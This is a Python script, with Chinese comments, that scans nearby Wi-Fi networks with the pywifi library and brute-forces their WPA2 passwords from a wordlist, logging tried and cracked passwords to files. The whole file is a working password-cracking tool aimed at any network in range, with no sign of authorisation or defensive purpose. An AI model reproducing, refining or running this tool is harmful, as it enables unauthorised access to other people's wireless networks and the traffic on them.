# -*- coding:utf8 -*-

import time
import pywifi
from pywifi import const

# 单个密码测试延迟, 超过说明连接太慢,放弃使用
testtimes = 15
# 结果文件保存路径
save_files = "pass2.txt"

passwords = [x.strip("\n") for x in open("pass.txt", "r").readlines()]
already_knows = [x.strip("\n").split("--")[0] for x in open(save_files, "r").readlines()]
already_tried = [x.strip("\n") for x in open("pass.txt", "r").readlines()]


def main():
    wifi = pywifi.PyWiFi()
    # 选择定一个网卡并赋值于iface
    iface = wifi.interfaces()[0]
    # 打印网卡名称
    print(iface.name())
    # 通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置
    scanres = scans(iface)
    # 扫描到的Wifi列表长度
    nums = len(scanres)
    print("附近wifi个数:" + str(nums))
    for i, x in enumerate(scanres):
        print(str(i) + ":" + str(x.ssid))  # 打印数值及Wifi名称x.ssid获取Wifi名称
        res = test_wifi(nums - i, iface, x, passwords, testtimes)  # 若res不为空，则找到密码
        if res:
            print("=====================================================================")
            print("找到密码:" + res)
            with open(save_files, "a") as f:
                f.write(res + "\n")
                return
            print("=====================================================================")


def scans(face):
    # 开始扫描
    face.scan()
    time.sleep(3)
    # 在3秒后获取扫描结果
    return face.scan_results()


def test_wifi(i, face, x, key, ts):
    # 显示对应网络名称，考虑到部分中文名啧显示bssid
    wifi_name = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
    if wifi_name in already_knows:
        print(str(wifi_name) + "--密码已知")
        return False
    print("尝试连接wifi:" + str(wifi_name))
    # 迭代字典并进行爆破
    total_key = len(key)
    for n, password in enumerate(key):
        if wifi_name + "--" + password in already_tried:
            print("密码试过了...")
            continue
        with open("already_tried_passwords.txt", "a") as f:
            f.write(wifi_name + "--" + password + "\n")
        already_tried.append(wifi_name + "--" + password)

        print("尝试密码:" + str(password) + " -- " + str(n) + "/" + str(total_key))
        # 生成对象而已，接下来就能对他进行配置操作了
        profile = pywifi.Profile()
        # ssid - AP的名称
        profile.ssid = wifi_name
        # auth - AP的认证算法
        profile.auth = const.AUTH_ALG_OPEN
        # akm - AP的密钥管理类型
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # cipher - AP的密码类型
        profile.cipher = const.CIPHER_TYPE_CCMP
        # key （optinoal） - AP的关键。如果无密码，则应该设置此项CIPHER_TYPE_NONE
        profile.key = password
        # 移除所有热点配置
        face.remove_all_network_profiles()
        # 加载配置文件
        tmp_profile = face.add_network_profile(profile)
        # 按配置文件进行连接
        face.connect(tmp_profile)
        # 初始化状态码，考虑到用0会发生些逻辑错误
        code = 10
        t1 = time.time()
        # 循环刷新状态，如果置为0则密码错误，如超时则进行下一个
        while code != 0:
            time.sleep(0.1)
            code = face.status()  # 获取连接状态
            now = time.time() - t1  # 获取已用时间
            if now > ts:  # 判断是否超时
                break
            if code == const.IFACE_CONNECTED:  # #判断连接状态4为连接成功状态
                # face.disconnect()#断开连接
                return str(wifi_name) + "--" + str(password)  # 返回密码
    return False


if __name__ == '__main__':
    main()